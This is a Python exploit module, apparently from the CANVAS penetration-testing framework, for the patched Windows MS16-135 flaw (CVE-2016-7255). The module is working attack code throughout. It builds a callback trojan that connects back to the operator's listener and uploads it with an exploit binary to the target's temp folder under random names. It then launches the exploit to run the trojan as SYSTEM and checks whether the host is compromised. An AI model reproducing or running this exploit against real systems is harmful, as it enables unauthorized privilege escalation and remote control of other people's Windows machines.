#!/usr/bin/env python

import os
import sys
import random

import logging

if '.' not in sys.path:
    sys.path.append('.')

import canvasengine
import time

from exploitutils import *
from ExploitTypes.windowsLocalExploit import WindowsLocalExploit
from shellcode.standalone.windows.payloads import payloads
from shellcode.standalone.windows.payloads64 import payloads as payloads64
from MOSDEF import pelib
from MOSDEF.mosdefutils import sint32
from libs.canvasos import canvasos

from WindowsConstants import KEY_QUERY_VALUE
from WindowsConstants import HKEY_LOCAL_MACHINE
from WindowsConstants import GENERIC_WRITE


NAME                           = 'MS16-135 SetWindowLongPtr Vulnerability'
DESCRIPTION                    = 'MS16-135 SetWindowLongPtr vulnerability allows arbitrary code execution as SYSTEM'
DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = 'Microsoft'
DOCUMENTATION['Repeatability'] = 'Infinite'
DOCUMENTATION['CVE Name']      = 'CVE-2016-7255'
DOCUMENTATION['CVE Url']       = 'http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7255'
VERSION                        = '1.0'
PROPERTY                       = {}
PROPERTY['TYPE']               = 'Exploit'
PROPERTY['SITE']               = 'Local'
PROPERTY['ARCH']               = [ ['Windows', 'x86'],
                                   ['Windows', 'x64'],
]
PROPERTY['MS PATCHES']         = ["KB3198234", "KB3194371"]

PROPERTY['VERSION']            = ['10 - Anniversary Update']
DOCUMENTATION["References"]    = ['https://technet.microsoft.com/en-us/library/security/ms16-135.aspx',
                                  'https://security.googleblog.com/2016/10/disclosing-vulnerabilities-to-protect.html',
                                  'http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7255',
]
DOCUMENTATION['Notes']         = """
The vulnerable (and now patched) function is actually xxxNextWindow(), but since
Google mentioned SetWindowLongPtr() in their release, we use that name here.

Older systems are definitely vulnerable, but we have developed/tested on Win10 Anniversary Update for now.
"""

CHANGELOG = """
"""

targets = {
    0: ['Autodetect', [0, 0, 0, 0]]
}


class theexploit(WindowsLocalExploit):
    def __init__(self):
        WindowsLocalExploit.__init__(self)
        self.name           = NAME
        self.node           = None
        self.local_res      = os.path.join(os.path.dirname(__file__), 'Resources')

    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]

    def detect_releaseid(self):
        RELEASEID_KEY = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"
        hKey = self.node.shell.get_reg_key_handle(HKEY_LOCAL_MACHINE, RELEASEID_KEY, KEY_QUERY_VALUE)

        releaseid = int(str(self.node.shell.RegQueryValueEx(hKey, "ReleaseID")[2]).strip('\0'))

        return releaseid

    def prepare_executables(self, tmp_directory):
        exploit_name = "%s.exe" % random.randint(1001, 2000)
        exploit_local_path = os.path.join(self.local_res, "tmp_%s" % exploit_name)
        exploit_rem_path = tmp_directory + exploit_name

        mosdef_dll_name = "%s.exe" % random.randint(2001, 3000)
        mosdef_local_path = os.path.join(self.local_res, "tmp_%s" % mosdef_dll_name)
        mosdef_rem_path = tmp_directory + mosdef_dll_name

        return_value = [(exploit_local_path, exploit_rem_path),
                        (mosdef_local_path, mosdef_rem_path)]

        exploit_orig_name = "exploit32.exe"
        if self.is_64bit_node() or self.has_wow64():
            exploit_orig_name = "exploit64.exe"

        # Generate the MOSDEF executable
        t_os = canvasos('WINDOWS')
        t_os.arch = 'X64' if self.is_64bit_node() or self.has_wow64() else 'X86'

        created_trojan = self.buildmosdeftrojan(self.callback.ip, self.callback.port, t_os, universal=True)

        if created_trojan != True:
            self.log_error("Error in generating our MOSDEF executable")
            return None
        else:
            logging.info("Writing MOSDEF callback to %s" % mosdef_local_path)

            with open(mosdef_local_path, "wb") as handle:
                handle.write(self.mosdeftrojan)

        exploit_data = None

        with open(os.path.join(self.local_res, exploit_orig_name), "rb") as handle:
            exploit_data = handle.read()

        logging.info("Writing exploit to %s" % exploit_local_path)

        with open(exploit_local_path, "wb") as handle:
            handle.write(exploit_data)

        return return_value

    def CreateVisibleProcess(self,command,inherithandles=0, dwCreationFlags=0x00000000):
        v={}
        v["lpAplicationName"]=None
        v["command"]=command
        v["inherithandles"]=inherithandles
        v["creationflags"] = dwCreationFlags

        is_x64 = False
        if self.is_64bit_node():
            logging.warning("64bit detected")
            is_x64 = True

        code = """
        #import "%s", "kernel32.dll|CreateProcessA" as "CreateProcessA"
        #import "%s", "kernel32.dll|GetStartupInfoA" as "GetStartupInfoA"

        #import "local", "memset" as "memset"
        #import "local","sendint" as "sendint"

        #import "string", "command" as "command"
        #import "string", "lpAplicationName" as "lpAplicationName"
        #import "int", "inherithandles" as "inherithandles"
        #import "int", "creationflags" as "creationflags"

        struct STARTUPINFO {
            int cb;
            char * lpReserved;
            char * lpDesktop;
            char * lpTitle;
            int dwX;
            int dwY;
            int dwXSize;
            int dwYSize;
            int dwXCountChars;
            int dwYCountChars;
            int dwFillAttribute;
            int dwFlags;
            short int wShowWindow;
            short int cbReserved2;
            int * lpReserved2;
            %s hStdInput;
            %s hStdOutput;
            %s hStdError;
        };

        void main() {
          struct STARTUPINFO si;
          int i;
          char pi[32];

          memset(pi,0,16);

          GetStartupInfoA(&si);
          si.dwFlags=0x0001; //STARTF_USESHOWWINDOW
          si.wShowWindow=1;  //SW_SHOWNORMAL

          // CreateProcess: http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dllproc/base/createprocess.asp
          i=CreateProcessA(lpAplicationName,command,0,0,inherithandles,creationflags,0,0,&si,pi);
          sendint(i);
        }
        """ % ("local" if is_x64 else "remote",
               "local" if is_x64 else "remote",
               "long long" if is_x64 else "int",
               "long long" if is_x64 else "int",
               "long long" if is_x64 else "int")

        self.node.shell.clearfunctioncache()
        request = self.node.shell.compile(code, v)
        self.node.shell.sendrequest(request)

        ret = sint32(self.node.shell.readint())

        self.node.shell.leave()

        return ret

    def GetSystemDirectoryA(self):
        """
        Gets the systemfile path.
        E.g. C:\windows\system32
        """
        vars = {}
        vars["lpName"] = "windir"

        is_x64 = self.is_64bit_node()
        self.node.shell.clearfunctioncache()
        request = self.node.shell.compile("""
            #import "%s", "kernel32.dll|GetEnvironmentVariableA" as "GetEnvironmentVariableA"
            #import "local", "sendstring" as "sendstring"
            #import "local", "sendint" as "sendint"
            #import "local", "memset" as "memset"
            #import "string", "lpName" as "lpName"
            void
            main()
            {
                char tmp[512];
                int n;

                memset(tmp, 0, 512);
                n = GetEnvironmentVariableA(lpName, tmp, 512);
                sendint(n);
                if (n != 0)
                {
                    sendstring(tmp);
                }
        }
        """% ("local" if is_x64 else "remote"), vars)
        self.node.shell.sendrequest(request)
        n = self.node.shell.readint()
        tmp = ''
        if n:
            tmp = self.node.shell.readstring()
        self.node.shell.leave()
        if n:
            tmp += '\\System32'
        logging.info( "Found system directory: %s"%tmp )
        return tmp


    def spawn_exploit(self, path, cmdAsSystem):
        logging.info("Spawning exploit: %s %s" % (path, cmdAsSystem))
        try:
            cmd_line = path + ' /cmd ' + cmdAsSystem
            """We need to create a visible window, and Canvas' CreateProcessA
               explicitly sets SW_HIDE
            ret = self.node.shell.CreateProcessA(cmd_line,
                                                 inherithandles = 1,
                                                 dwCreationFlags = 0)
            """
            ret = self.CreateVisibleProcess(cmd_line)
        except Exception, ex:
            self.log_error('%s' % ex)
            return False

        return ret

    def run(self):
        ret = 0
        for node in self.argsDict['passednodes']:
            self.summary[node] = 0
            self.node = node

            if not self.is_windows_node():
                continue

            if not any([self.is_win10_node()]):
                logging.error("Not Windows 10 node! Aborting")
                continue


            if not (self.is_64bit_node() or self.has_wow64):
                logging.error("Not 64-bit node! Aborting")
                continue

            releaseid = self.detect_releaseid();
            if releaseid != 1607:
                logging.error("Not Windows Release ID supported")
                continue

            system_path = self.GetSystemDirectoryA()
            win32u_path = system_path + "\\win32u.dll"
            #CreateFile(self,filename,access,sharemode,security,creationdisposition,flags)
            GENERIC_READ = long(0x80000000L)
            FILE_SHARE_READ = 1
            OPEN_EXISTING = 3

            remoteHandle = self.node.shell.CreateFile(win32u_path, GENERIC_READ, FILE_SHARE_READ, None, OPEN_EXISTING, 0)
            if remoteHandle == -1:
                logging.warning("This version of Windows 10 is too old for our exploit")
                return False
            self.node.shell.CloseHandle(remoteHandle)

            # first, we check to make sure we are not
            # already local/SYSTEM
            if self.compromised():
                logging.warning("It appears you are already running as LOCAL/SYSTEM")
                return True

            tmp_path = self.node.shell.GetTempPathA()
            if not tmp_path:
                logging.error('Could not resolve full temp dir path')
                return False
            else:
                logging.info('Temp dir: %s' % tmp_path)

            if self.node.shell.chdir(tmp_path) < 0:
                logging.error('Could not chdir into %s' % tmp_path)
                return False

            pe_info = self.prepare_executables(tmp_path)

            logging.info("Callback IP: %s" % self.callback.ip)
            logging.info("Callback port: %s" % self.callback.port)

            if pe_info == None:
                logging.error("Failed to generate necessary executables")
                return False

            remote_exploit_path = None

            for (local_path, remote_path) in pe_info:
                if not self.nodeUpload(local_path, remote_path):
                    logging.error('Error while uploading exploit binary')
                    return False

                os.unlink(local_path)
                self.add_file_for_cleanup(remote_path)

            remote_exploit_path = pe_info[0][1]
            remote_mosdef_path = pe_info[1][1]

            problem_exploit = False

            if not self.spawn_exploit(remote_exploit_path, remote_mosdef_path):
                logging.error('Could not spawn %s' % NAME)
                module_succeeded.append(False)
                self.summary[node] = 0
                module_succeeded.append(False)
            else:
                time.sleep(5)
                logging.info("Checking if we are now an administrator...")
                ret = self.compromised()
                if not ret:
                    return False

                self.summary[node] = 1

            ret = 1

        return ret


if __name__ == '__main__':
    logging.info("Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)
